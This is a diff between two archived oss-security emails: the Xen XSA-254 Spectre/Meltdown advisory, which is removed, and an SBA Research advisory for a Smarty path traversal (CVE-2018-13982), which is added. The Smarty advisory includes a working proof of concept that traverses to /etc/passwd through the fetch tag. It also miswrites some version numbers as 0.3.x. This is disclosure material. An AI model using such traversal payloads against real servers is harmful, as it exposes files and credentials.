@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["29599" "Friday" "12" "January" "2018" "17:36:32" "+0000" "Xen.org security team" "security@xen.org" "<E1ea3Fo-0000JJ-8f@xenbits.xenproject.org>" "563" "[oss-security] Xen Security Advisory 254 (CVE-2017-5753,CVE-2017-5715,CVE-2017-5754) - Information leak via side effects of speculative execution" nil nil nil "1" "2018011217:36:32" "[oss-security] Xen Security Advisory 254 (CVE-2017-5753,CVE-2017-5715,CVE-2017-5754) - Information leak via side effects of speculative execution" (number mark "U       security@xen Jan 12  563/29599 " thread-indent "\"[oss-security] Xen Security Advisory 254 (CVE-2017-5753,CVE-2017-5715,CVE-2017-5754) - Information leak via side effects of speculative execution\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["10656" "Monday" "17" "September" "2018" "19:15:52" "+0200" "SBA Research Advisory" "advisory@sba-research.org" "<f177b51a-cedc-80a0-ac95-d6a6440ad5e2@sba-research.org>" "260" "[oss-security] [SBA-ADV-20180420-01] CVE-2018-13982: Smarty 3.1.32 or below Trusted-Directory Bypass via Path Traversal" nil nil nil "9" "2018091717:15:52" "[oss-security] [SBA-ADV-20180420-01] CVE-2018-13982: Smarty 3.1.32 or below Trusted-Directory Bypass via Path Traversal" (number mark "U       advisory@sba Sep 17  260/10656 " thread-indent "\"[oss-security] [SBA-ADV-20180420-01] CVE-2018-13982: Smarty 3.1.32 or below Trusted-Directory Bypass via Path Traversal\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 3894 invoked by uid 550); 12 Jan 2018 17:37:06 -0000
+Received: (qmail 15620 invoked by uid 550); 17 Sep 2018 18:41:15 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,580 +12,322 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 3820 invoked from network); 12 Jan 2018 17:37:03 -0000
-Content-Type: multipart/mixed; boundary="=separator"; charset="utf-8"
-Content-Transfer-Encoding: binary
+Received: (qmail 22344 invoked from network); 17 Sep 2018 17:16:18 -0000
+From: SBA Research Advisory <advisory@sba-research.org>
+To: <oss-security@lists.openwall.com>
+Openpgp: preference=signencrypt
+Autocrypt: addr=advisory@sba-research.org; keydata=
+ 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
+ 5WT/0Mk3JDbE
+Message-ID: <f177b51a-cedc-80a0-ac95-d6a6440ad5e2@sba-research.org>
+Date: Mon, 17 Sep 2018 19:15:52 +0200
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101
+ Thunderbird/60.0
 MIME-Version: 1.0
-X-Mailer: MIME-tools 5.505 (Entity 5.505)
-To: xen-announce@lists.xen.org, xen-devel@lists.xen.org,
- xen-users@lists.xen.org, oss-security@lists.openwall.com
-From: Xen.org security team <security@xen.org>
-CC: Xen.org security team <security-team-members@xen.org>
-Message-Id: <E1ea3Fo-0000JJ-8f@xenbits.xenproject.org>
-Date: Fri, 12 Jan 2018 17:36:32 +0000
-Subject: [oss-security] Xen Security Advisory 254 (CVE-2017-5753,CVE-2017-5715,CVE-2017-5754)
- - Information leak via side effects of speculative execution
+Content-Type: multipart/signed; micalg=pgp-sha256;
+	protocol="application/pgp-signature";
+	boundary="DGrPi0DeKwvjcwM8fGZYN4soYh03alDfs"
+X-Originating-IP: [192.168.20.52]
+Subject: [oss-security] [SBA-ADV-20180420-01] CVE-2018-13982: Smarty 3.1.32 or below
+ Trusted-Directory Bypass via Path Traversal
 
---=separator
-Content-Type: text/plain; charset="utf-8"
-Content-Disposition: inline
-Content-Transfer-Encoding: 7bit
+--DGrPi0DeKwvjcwM8fGZYN4soYh03alDfs
+Content-Type: multipart/mixed; boundary="Z7yeQ8espXUREW2BMlKbJMdPp73QmrUxc";
+ protected-headers="v1"
+From: SBA Research Advisory <advisory@sba-research.org>
+To: oss-security@lists.openwall.com
+Message-ID: <f177b51a-cedc-80a0-ac95-d6a6440ad5e2@sba-research.org>
+Subject: [SBA-ADV-20180420-01] CVE-2018-13982: Smarty 3.1.32 or below
+ Trusted-Directory Bypass via Path Traversal
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+--Z7yeQ8espXUREW2BMlKbJMdPp73QmrUxc
+Content-Type: multipart/mixed;
+ boundary="------------60E5B8BFC2692ED645AE35FB"
+Content-Language: en-US
 
- Xen Security Advisory CVE-2017-5753,CVE-2017-5715,CVE-2017-5754 / XSA-254
-                                 version 6
+This is a multi-part message in MIME format.
+--------------60E5B8BFC2692ED645AE35FB
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: quoted-printable
 
-        Information leak via side effects of speculative execution
+# Smarty Trusted-Directory Bypass via Path Traversal #
 
-UPDATES IN VERSION 6
-====================
+Link: https://github.com/sbaresearch/advisories/tree/public/2018/SBA-ADV-20=
+180420-01_Smarty_Path_Traversal
 
-PVH shim ("Comet") for 4.10 is available.
+## Vulnerability Overview ##
 
-Mention within-guest attack in README.vixen as well as
-README.which-shim.
+Smarty 3.1.32 or below is prone to a path traversal vulnerability due
+to insufficient template code sanitization. This allows attackers
+controlling the executed template code to bypass the trusted directory
+security restriction and read arbitrary files.
 
-Vixen shim converter script "exec"s qemu, avoiding stale qemu
-processes (and, therefore, avoiding stale domains).
+* **Identifier**            : SBA-ADV-20180420-01
+* **Type of Vulnerability** : Path Traversal
+* **Software/Product Name** : [Smarty](https://www.smarty.net/)
+* **Vendor**                : Smarty
+* **Affected Versions**     : 3.1.32 and probably prior
+* **Fixed in Version**      : 3.1.33
+* **CVE ID**                : CVE-2018-13982
+* **CVSSv3 Vector**         : CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+* **CVSSv3 Base Score**     : 8.6 (High)
 
-ISSUE DESCRIPTION
-=================
+## Vendor Description ##
 
-Processors give the illusion of a sequence of instructions executed
-one-by-one.  However, in order to most efficiently use cpu resources,
-modern superscalar processors actually begin executing many
-instructions in parallel.  In cases where instructions depend on the
-result of previous instructions or checks which have not yet
-completed, execution happens based on guesses about what the outcome
-will be.  If the guess is correct, execution has been sped up.  If the
-guess is incorrect, partially-executed instructions are cancelled and
-architectural state changes (to registers, memory, and so on)
-reverted; but the whole process is no slower than if no guess had been
-made at all.  This is sometimes called "speculative execution".
+> Smarty is a template engine for PHP, facilitating the separation of
+> presentation (HTML/CSS) from application logic. This implies that PHP
+> code is application logic, and is separated from the presentation.
 
-Unfortunately, although architectural state is rolled back, there are
-other side effects, such as changes to TLB or cache state, which are
-not rolled back.  These side effects can subsequently be detected by
-an attacker to determine information about what happened during the
-speculative execution phase.  If an attacker can cause speculative
-execution to access sensitive memory areas, they may be able to infer
-what that sensitive memory contained.
+Source: <https://www.smarty.net/about_smarty>
 
-Furthermore, these guesses can often be 'poisoned', such that attacker
-can cause logic to reliably 'guess' the way the attacker chooses.
-This advisory discusses three ways to cause speculative execution to
-access sensitive memory areas (named here according to the
-discoverer's naming scheme):
+## Impact ##
 
-"Bounds-check bypass" (aka SP1, "Variant 1", Spectre CVE-2017-5753):
-Poison the branch predictor, such that victim code is speculatively
-executed past boundary and security checks.  This would allow an
-attacker to, for instance, cause speculative code in the normal
-hypercall / emulation path to execute with wild array indexes.
+An attacker controlling the executed template code can read arbitrary
+files accessible by the webserver by exploiting the vulnerability
+documented in this advisory. Sensitive data such as database credentials
+might get exposed through this attack.
 
-"Branch Target Injection" (aka SP2, "Variant 2", Spectre CVE-2017-5715):
-Poison the branch predictor.  Well-abstracted code often involves
-calling function pointers via indirect branches; reading these
-function pointers may involve a (slow) memory access, so the CPU
-attempts to guess where indirect branches will lead.  Poisoning this
-enables an attacker to speculatively branch to any code that is
-executable by the victim (eg, anywhere in the hypervisor).
+We recommend upgrading to version 3.1.33 or newer.
 
-"Rogue Data Load" (aka SP3, "Variant 3", Meltdown, CVE-2017-5754):
-On some processors, certain pagetable permission checks only happen
-when the instruction is retired; effectively meaning that speculative
-execution is not subject to pagetable permission checks.  On such
-processors, an attacker can speculatively execute arbitrary code in
-userspace with, effectively, the highest privilege level.
+## Vulnerability Description ##
 
-More information is available here:
-  https://meltdownattack.com/
-  https://spectreattack.com/
-  https://googleprojectzero.blogspot.co.uk/2018/01/reading-privileged-memory-with-side.html
+Smarty allows restricting which paths are accessible paths during
+template evaluation. This feature is implemented in the
+`Smarty_Security` class and is enabled via the method `enableSecurity`.
+However, the trusted directory check implemented in the method
+`isTrustedResourceDir` of the `Smarty_Security` class is vulnerable to
+path traversal.
 
-Additional Xen-specific background:
+The method `isTrustedResourceDir` first builds a list of allowed
+directories in `$filepath` and then relies on the `_checkDir` method
+to check if the requested resource dir is trusted. In version 0.3.31
+neither `isTrustedResourceDir` nor `_checkDir` avoid path traversal:
 
-Xen hypervisors on most systems map all of physical RAM, so code
-speculatively executed in a hypervisor context can read all of system
-RAM.
+```php
+public function isTrustedResourceDir($filepath, $isConfig =3D null)
+{
+    [...]
+    $this->_resource_dir =3D $this->_checkDir($filepath, $this->_resource_d=
+ir);
+    return true;
+}
 
-When running PV guests, the guest and the hypervisor share the address
-space; guest kernels run in a lower privilege level, and Xen runs in
-the highest privilege level.  (x86 HVM and PVH guests, and ARM guests,
-run in a separate address space to the hypervisor.)  However, only
-64-bit PV guests can generate addresses large enough to point to
-hypervisor memory.
+private function _checkDir($filepath, $dirs)
+{
+    $directory =3D dirname($filepath) . DIRECTORY_SEPARATOR;
+    $_directory =3D array();
+    while (true) {
+        // remember the directory to add it to _resource_dir in case we're =
+successful
+        $_directory[ $directory ] =3D true;
+        // test if the directory is trusted
+        if (isset($dirs[ $directory ])) {
+            // merge sub directories of current $directory into _resource_d=
+ir to speed up subsequent lookup
+            $dirs =3D array_merge($dirs, $_directory);
+            return $dirs;
+        }
+        // abort if we've reached root
+        if (!preg_match('#[\\\/][^\\\/]+[\\\/]$#', $directory)) {
+            break;
+        }
+        // bubble up one level
+        $directory =3D preg_replace('#[\\\/][^\\\/]+[\\\/]$#', DIRECTORY_SE=
+PARATOR, $directory);
+    }
+    // give up
+    throw new SmartyException("directory '{$filepath}' not allowed by secur=
+ity setting");
+}
+```
 
-IMPACT
-======
+In version 0.3.32 `_checkDir` calls `_realpath` before checking if the
+requested resource is trusted. However, the custom realpath method is
+broken and allows path traversal at least on Unix systems.
 
-Xen guests may be able to infer the contents of arbitrary host memory,
-including memory assigned to other guests.
+For example, the fetch tag uses the `isTrustedResourceDir` method to
+check if a user-specified path is allowed to read.
 
-An attacker's choice of code to speculatively execute (and thus the
-ease of extracting useful information) goes up with the numbers.  For
-SP1, an attacker is limited to windows of code after bound checks of
-user-supplied indexes.  For SP2, the attacker will in many cases will
-be limited to executing arbitrary pre-existing code inside of Xen.
-For SP3 (and other cases for SP2), an attacker can write arbitrary
-code to speculatively execute.
+## Proof-of-Concept ##
 
-Additionally, in general, attacks within a guest (from guest user to
-guest kernel) will be the same as on real hardware.  Consult your
-operating system provider for more information.
+An attacker can exploit this vulnerability by using the fetch tag:
 
-NOTE ON TIMING
-==============
+```php
+{fetch file=3D"/var/www/templates/../../../../../etc/passwd"}
+```
 
-This vulnerability was originally scheduled to be made public on 9
-January.  It was accelerated at the request of the discloser due to
-one of the issues being made public.
+Full example:
 
-VULNERABLE SYSTEMS
-==================
+```php
+<?php
+require_once "vendor/autoload.php";
 
-Systems running all versions of Xen are affected.
+$smarty =3D new Smarty;
+$smarty->enableSecurity();
+// Fails
+//$smarty->display('eval:{fetch file=3D"/etc/passwd"}');
+// Works
+$smarty->display('eval:{fetch file=3D"'.addslashes(getcwd()).'/templates/..=
+/../../../../etc/passwd"}');
+```
 
-For SP1 and SP2, both Intel and AMD are vulnerable.  Vulnerability of
-ARM processors to SP1 and SP2 varies by model and manufacturer.  ARM
-has information on affected models on the following website:
-   https://developer.arm.com/support/security-update
+## Timeline ##
 
-For SP3, only Intel processors are vulnerable.  (The hypervisor cannot
-be attacked using SP3 on any ARM processors, even those that are
-listed as affected by SP3.)
+* `2018-04-20`: identification of vulnerability in version 3.1.31
+* `2018-04-23`: initial vendor contact
+* `2018-04-23`: disclosed vulnerability to vendor
+* `2018-04-24`: vendor acknowledged vulnerability and released version 3.1.=
+32
+* `2018-04-25`: notified vendor about incomplete fix
+* `2018-04-26`: vendor fixed vulnerability
+* `2018-07-10`: request CVE from MITRE
+* `2018-07-11`: MITRE assigned CVE-2018-13982
+* `2018-09-12`: vendor released fix in version 3.1.33
+* `2018-09-17`: public release
 
-Furthermore, only 64-bit PV guests can exploit SP3 against Xen.  PVH,
-HVM, and 32-bit PV guests cannot exploit SP3.
+## References ##
 
-MITIGATION
-==========
+* Changelog: <https://github.com/smarty-php/smarty/commit/bcedfd6b58bed4a73=
+66336979ebaa5a240581531>
+* Patches:
+  * <https://github.com/smarty-php/smarty/commit/8d21f38dc35c4cd6b31c2f23fc=
+9b8e5adbc56dfe>
+  * <https://github.com/smarty-php/smarty/commit/f9ca3c63d1250bb56b2bda609d=
+cc9dd81f0065f8>
+  * <https://github.com/smarty-php/smarty/commit/2e081a51b1effddb23f8795295=
+9139ac62654d50>
+  * <https://github.com/smarty-php/smarty/commit/c9dbe1d08c081912d02bd851d1=
+d1b6388f6133d1>
 
-There is no mitigation for SP1 and SP2.
+## Credits ##
 
-SP3 can be mitigated by running guests in HVM or PVH mode.
-(Within-guest attacks are still possible unless the guest OS has also
-been updated with an SP3 mitigation series such as KPTI/Kaiser.)
+* David Gnedt ([SBA Research](https://www.sba-research.org/))
+* Thomas Konrad ([SBA Research](https://www.sba-research.org/))
 
-For guests with legacy PV kernels which cannot be run in HVM or PVH
-mode directly, we have developed two "shim" hypervisors that allow PV
-guests to run in HVM mode or PVH mode.  This prevents attacks on the
-host, but it leaves the guest vulnerable to Meltdown attacks by its
-own unprivileged processes, even if the guest OS has KPTI or similar
-Meltdown mitigation.
+--------------60E5B8BFC2692ED645AE35FB
+Content-Type: application/pgp-keys;
+ name="0xFBB8862F58F775B2.asc"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: attachment;
+ filename="0xFBB8862F58F775B2.asc"
 
-The HVM shim (codenamed "Vixen") is available now, as is the PVH shim
-(codenamed "Comet") for Xen 4.10.  We expect to have Comet for 4.8 and
-4.9 within a few days.  Please read README.which-shim to determine
-which shim is suitable for you.
+-----BEGIN PGP PUBLIC KEY BLOCK-----=0A=
+=0A=
+mQINBFYydZgBEADJRw9wo4WeBOtCXODKDpyqVaiSSMmEvwIoyu9ZVcQ5yw5wzczu=0A=
+M7bcLUhAEwEsiWmfJy6XzF1N6gBcOErFzh8vz+HZFlMirsm5oZ3aRt8TaMkuoCCh=0A=
+CxxT637yxAFq/7NPq8swiUwps345SI5LuBn34SphQbZvdoPfkIG+VfvyxHOuMM33=0A=
+S+78QGRFZyNMiNjCWscw/1kWIKf61cfX4uzV/dxzvFyRba6zF2rSD0tVURXTDCys=0A=
+3NQ8NFTrLFJ9044005iktRXXSxjTvHzL5qfjLpKHXHWUwzveBaT/rEyS/YGHLP9B=0A=
+SKm8MMpQMUqI5nqq/LUceJmOfIM1loSz/hxGpP54QLYlaC0sJQBciucXkwm2eFoH=0A=
+6N6zS6aVHK527/tCAQdZ3uR1LzuViCK1SnrOuoHrzds5b1/gPegMUn6EatJ5gpO/=0A=
+I3p+uxXHUEjOCgwnY/l5kpyzTAqvgUY/Zl+oI6FfdVDhEjUsZ/JQpZI70HoG9Gp8=0A=
+UTAqrtIjXkPOEQF3xlvDaDHq7R0H5Fsjg1Icpddz7fWjnlwfJGzK2zKOVGaZfKnS=0A=
+NvRqqljkNpc4DyQUe7WsfONhrxID3opavGrNbg7pp/qpCfhOCqtJPECwgmJHHBaN=0A=
+vwDwet4GMcl7F/4NVk0xg7lDMd+GFuYlN8taJpEiVlASDKoB9dxM9pDNSwARAQAB=0A=
+tCRhZHZpc29yeSA8YWR2aXNvcnlAc2JhLXJlc2VhcmNoLm9yZz6JAj4EEwECACgF=0A=
+AlYydZgCGwMFCQWuJoAGCwkIBwMCBhUIAgkKCwQWAgMBAh4BAheAAAoJEPu4hi9Y=0A=
+93WyX3EQAKLVHVHi5qr3QyeMRArYS0ODmqJmSavINWngLgGR0kuLOya9GWIyG43Z=0A=
+N1YwMDdMBd2TM3RxEkHMmmo3o/eYUywcJjqMBFKegktAIb4ynOB7+4b0nKCHLWdj=0A=
+N26/J72NqEr5TDdAocK+tv5jWJIMQ48uMlQAEg23lt91bZugroZxzDDHzUTjNRE5=0A=
+uX9azT0Sc4CsDDmdeQa1THDwdpsIsq4qAYyWXbzu7zRkjWMYgAXBISBqMhvyyH1L=0A=
+i2kLrMISjg82LpUx5960rP0CQpQ70KPWaQd3jjE9/xK2+CHADBwA6SM7CxQ3m6lW=0A=
+SuBYkbKZvaFshwKZAnyq6t+E0FF7JVpMxmA7SGu0W9FSkJ8LY5ctg3l/ZsJYBRQr=0A=
+2w9BK0yMLhauO4msCCXmU2ApnWb38RdnSFcHJToX6dNc8AEqOAPlf1QVKiIqPW9i=0A=
+nSMwNEPrHOT4tGgIuU6+Q+z/DEaktup/xtOXg2cfD0kpA7lPUm30175WcvNvdG2O=0A=
+K15Eh+6zzN+EZXIjKb87ofYjQf7mLoHn9pDdqTvuXqidc0ztV40z//PYD2VATgg9=0A=
+Y1Mb+MjjayA1p/OEhMZKArFGpGA4CYqWz+2URFRUATgpDBcSgHMC37lXT6J+Aos1=0A=
+w2pmQKTB2s49hFX+8bIS2MXSVJdPgwrKdOzLROXf0WF6R7UBWXAouQINBFYydZgB=0A=
+EADhENFUhRHrt2/Jtkpg1yVqbW+UhrNrLOJ7FCVCioeLVZCgF50ZwLnupu0cZfKR=0A=
+HfkdRKEnog7LazoigDvGryDXZh/5EFnhxezBiScHWfDNHNz/3/ESty36ewjYsghJ=0A=
+LZzgX9qa+hW1TIagEMOWHyY8BnA/D+XByHrt7nw1t+vq7QEkUlXv4sCWMPu8dPf4=0A=
++s3LWpLTx3J+gRyqiAkhhQb90EydBETlLs0rGvZUt1Cia2KglbJqORCJIhYAtIy2=0A=
+2UqPfzZRfaw9CsdlmVeKt15UqK10m6bqbbtdI4p0Z4PlYVHDrW8VyeEij5aph10A=0A=
+Mmc2klppSooXt49fRRge314m5WWbtVyJray/0bZ9JTIHT4NVWtBsY/ItQf5YrTzr=0A=
+WA2fjzle+pQxtPNfMsKLzzs43jjQvKfX0SGVR4YBD+zYbtkViTxs5KRK1OKo4GRF=0A=
+/XaetIwFd23a+1w8HgRClA3H7kKAxOnKHw9VOXYouxAjsBulw68EVxiHqre8j0he=0A=
+9dssrSizB/H+sNSYzzr1yByGpMV2PWRpRcYTi2FFzT9oB0yux2yjZe7mejUBNZsP=0A=
+czQKkUFHXhS3Fm4kNAWO0wLwJw1gnDGeJ1KN5fU2jSw2L+nVL4GlQUbSq0aPPtFG=0A=
+QSWekIfLz5w4TEFqC5CXt8evGYzlOG3MQiGM7bFkvuWNVQARAQABiQIlBBgBAgAP=0A=
+BQJWMnWYAhsMBQkFriaAAAoJEPu4hi9Y93Wy5dwP/0L16IGdlQR8LXKPsNAOlZhw=0A=
+BoKaOJ+xikt/2ESKrNmCxJdIZhdBH17Sv/ucvF2eeybJPyD3v2nkZ/UOIOnWb918=0A=
+9r5vlR/X3IPT5ScNWxxq9eSwUay4gMIeuuHBGln2m8PJRWduwoHVVJTK/nfKiC5v=0A=
+CjDup3PEoLEIzbvfmHPkzBZjpwN+YSCC0CwLel/UbtgDZnPeyXLZgVqldoq7+Ef5=0A=
+ztQaBcdA9DBARrqX04RhZhu8xOQzeeTuvzflkUGa5X5mg4vDKstX1tZi2isRVFyk=0A=
+FdpcXCxWVHNVTHW4+9ILeE+to2PRd1Fjv21E9/9V1zuAF5+eU86dX2pM4eKmXpyJ=0A=
+Eityff+LyqSkLGRYnwXZILGaSVPAdolOr/2IZVtUOzP7NlxZPzYRFUo1dvNmlrBc=0A=
+HpatY2YMoOGt/eD/jO2dm7RF6hK2BXCog0y5kdWvskOE0Jc8IBK55T2ss/xqCQ0V=0A=
+fElgATTFBxpj68INUya8Crn3hhv3XxHeKQ7CHJYvJmu5wZgIq31PDTZy3zbxmVSm=0A=
+YUQ3rTm7aOtYQKCEBH8WgH8YT8g+cJDrzIssMM5VDJ8KW7sanjwNQNnWR5qx6FRt=0A=
+g0Qf7Syk5oW+mId6haBAKZD2C1D4TVmSws1f5TzDuM3zydCgoichtF2wdcP5STnM=0A=
+baPJKZK05WT/0Mk3JDbE=0A=
+=3Dg3EM=0A=
+-----END PGP PUBLIC KEY BLOCK-----=0A=
+=0A=
 
-$ sha256sum xsa254*/*
-f81c4624f8b188a2c33efa8687d3442bbd17c476e1a10761ef70c0aa99f6c659  xsa254/README.comet
-1c594822dbd95998951203f6094bc77586d5720788de15897784d20bacb2ef08  xsa254/README.vixen
-7e816160c1c1d1cd93ec3c3dd9753c8f3957fefe86b7aa967e9e77833828f849  xsa254/README.which-shim
-1d2098ad3890a5be49444560406f8f271c716e9f80e7dfe11ff5c818277f33f8  xsa254/pvshim-converter.pl
-$
+--------------60E5B8BFC2692ED645AE35FB--
 
-RESOLUTION
-==========
+--Z7yeQ8espXUREW2BMlKbJMdPp73QmrUxc--
 
-There is no available resolution for SP1.  A solution may be available
-in the future.
+--DGrPi0DeKwvjcwM8fGZYN4soYh03alDfs
+Content-Type: application/pgp-signature; name="signature.asc"
+Content-Description: OpenPGP digital signature
+Content-Disposition: attachment; filename="signature.asc"
 
-We are working on patches which mitigate SP2 but these are not
-currently available.  Given that the vulnerabilities are now public,
-these will be developed and published in public, initially via
-xen-devel.
-
-
-NOTE ON LACK OF EMBARGO
-=======================
-
-The timetable and process were set by the discloser.
-
-After the intensive initial response period for these vulnerabilities
-is over, we will prepare and publish a full timeline, as we have done
-in a handful of other cases of significant public interest where we
-saw opportunities for process improvement.
 -----BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
 
-iQEcBAEBCAAGBQJaWPIbAAoJEIP+FMlX6CvZQuoH/0A21scnQhrQPmFjtBO0b0Ai
-/xQ7VCf2t3iKeZYJJGzj2atE1Hj91H6sZe6t6tLFbfPeYv2Gbfpl/09EE8ONSpSj
-ae69fgwQN/EvpkCVec+QWQ0pWj7tLYgkT4IwQJSW+6VrTWjEV8PzQgkfjgclJEOk
-J7EhaauI0qZVPEC2QZoMGJlgwfoS4xJalpCUGflrvgtmPhYbGGYDP8bP7WbVtqYS
-I9nIoqndBdeWeyyu1O+cnMquV5BX2Nq7BDOTB3SMwNBHsnKudRQQRc3yNdmvQa2C
-jvUMs/U7rqfK5pgOfimvLSDLR0TSnzNC8ahuI9Tv6TSwIl+AVt4xg0DZzhMjiqQ=
-=aOVG
+iQIzBAEBCAAdFiEEL9Wp/yZWFD9OpIt6+7iGL1j3dbIFAluf4UgACgkQ+7iGL1j3
+dbJCaw//WAsBkAuAmFpPKHsEHk8AijbsvQKNglbC6dBqu+P2RkFIIv3e4UvHLLjB
+d0NNmcCsqq/GuzITRpdrRQO8d8y8iFmTw6XKTRf2BC76aUsikJd7zjUG/qb8FWWx
+u/7Ah425uUGjwmLPbYryLTmQfwxz7MWZVaNrji7UgCFe0TKvK8VkVgPLabMyoc1j
+svv2bcljff4R/Te+7Np7/8e5aLjoiSLc0lq+GibFrOa584Z1MyxuMDwrR4PkQyuB
+MA066XoNUk4Ao59UgLR6BtmyD61oMxEImg7qK/HufPw+j5r+DcGjstpeQMVXHd1v
